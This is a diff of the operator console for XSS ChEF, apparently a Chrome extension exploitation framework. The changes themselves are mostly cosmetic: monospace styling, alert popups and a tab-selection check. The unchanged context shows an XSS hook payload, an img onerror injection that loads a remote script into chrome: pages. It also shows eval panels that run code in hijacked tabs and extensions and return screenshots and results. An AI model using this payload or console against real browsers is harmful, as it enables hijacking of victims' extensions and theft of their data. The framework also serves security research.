@@ -17,6 +17,16 @@ color: #FFFFFF !important;
 .modal {
 display:none;
 }
+
+.mono {
+font-family: Menlo, Monaco, "Courier New", monospace;
+}
+#alert {
+position: absolute;
+top: 45px;
+right: 20px;
+display:none;
+}
 </style>
 <body>
 <div class="navbar navbar-fixed-top">
@@ -96,12 +106,11 @@ display:none;
                                             <div class="tab-pane" id="tab-commands">
                                                 <form class="well" action="#">
                                                     <h4>Eval</h4>
-                                                    <textarea name=eval style="width: 100%; height: 100px" placeholder="alert(/place code to eval in this tab here/)"></textarea>
-                                                    <p>
+                                                    <textarea class=mono name=eval style="width: 100%; height: 100px" placeholder="alert(/place code to eval in this tab here/)"></textarea>
                                                     <button id=eval type="button" class="btn btn-primary">Eval</button>
                                                     </p>
                                                     <h4>Result</h4>
-                                                    <textarea style="width: 100%; height: 300px" id=eval-result placeholder="result will be placed here."></textarea>
+                                                    <textarea class=mono style="width: 100%; height: 300px" id=eval-result placeholder="result will be placed here."></textarea>
                                                 </form>
                                             </div>
                                             <div class="tab-pane" id="tab-html">
@@ -158,10 +167,10 @@ display:none;
             </ul>
                             <form action="#">
                                 <label>Eval</label>
-                                <textarea name=eval-ext class="span8" placeholder="alert(/place code to eval in extension/)"></textarea>
+                                <textarea name=eval-ext class="mono span8" placeholder="alert(/place code to eval in extension/)"></textarea>
                                 <p><button type="button" id=eval-ext class="btn btn-secondary">Eval</button></p>
                                 <label>Result</label>
-                                <textarea id=eval-ext-result class="span8" placeholder="result will be placed here."></textarea>
+                                <textarea id=eval-ext-result class="mono span8" placeholder="result will be placed here."></textarea>
                             </form>
                             
                         </div>
@@ -186,14 +195,12 @@ display:none;
   <div class="modal-body">
     <img id=screenshot />
   </div>
-  <div class="modal-footer">
-  </div>
 </div>
 
 <div class="modal" id="about-modal">
   <div class="modal-header">
     <a class="close" data-dismiss="modal">&times;</a>
-    <h3>About</h3>
+    <h3>About XSS ChEF</h3>
   </div>
   <div class="modal-body">
       <h2>XSS <abbr title="Chrome exploitation framework">ChEF</a></h2>
@@ -215,8 +222,11 @@ display:none;
       <pre>&lt;img src=x onerror="if(location.protocol.indexOf('chrome')==0){d=document;e=createElement('script');e.src='http://dev.localhost/xss-chef/xsschef.js';d.body.appendChild(e);}"&gt;</pre>
       <p>Launch this console and start having fun!
   </div>
-  <div class="modal-footer">
-  </div>
+</div>
+
+<div id="alert" class="alert alert-info span3">
+  <a class="close" data-dismiss="alert">&times;</a>
+  <span id="alert-msg"></span>
 </div>
 <script>
 
@@ -352,6 +362,10 @@ function loadTabData(id) {
     
 }
 
+function al(txt) {
+    $('#alert-msg').text(txt);
+    $('#alert').fadeIn().delay(1500).fadeOut();
+}
 
 function processResponse(r, hook) {
     if (typeof r == 'string' || !r.type) {
@@ -363,6 +377,7 @@ function processResponse(r, hook) {
         case 'recvstuff':
             hookStorage.updateTab(hook, r.id, r.result);
             refreshTabsTable(hookStorage.getTabs(hook));
+            al('Received response.');
         break;
         case 'recvscreenshot':
             $("#screenshot").attr('src', r.url);
@@ -370,6 +385,7 @@ function processResponse(r, hook) {
             break;
         break;        
         case 'recveval':
+            al('Received eval response.');
             if (!r.id) {
                 $('#eval-ext-result').val(JSON.stringify(r.result));
             } else {
@@ -385,6 +401,7 @@ function processResponse(r, hook) {
             fillDataTemplate($('#tab-ext-info'), r.result);
         break;
         case 'pong':
+            al('Pong from ' + r.url);
             log('pong ' + r.url);
         break;
     }
@@ -406,8 +423,12 @@ $(function() {
     });
 
     $('#eval').click(function() {
-        sendCmd('eval', $('[name=eval]').val(), {id: currentTab});
-        $('#eval-result').val('');
+        if (!currentTab) {
+            al("No tab selected!");
+        } else {
+            sendCmd('eval', $('[name=eval]').val(), {id: currentTab});
+            $('#eval-result').val('');
+        }
     });
 
     $('#report-html').click(function() {
@@ -437,6 +458,7 @@ $(function() {
     
     // start with saved data
     refreshTabsTable(hookStorage.getTabs(hook));
+    al("Refreshed state from local storage");
     fillDataTemplate($('#tab-ext-info'), hookStorage.retrieve(hook, 'info', {}));
 
 
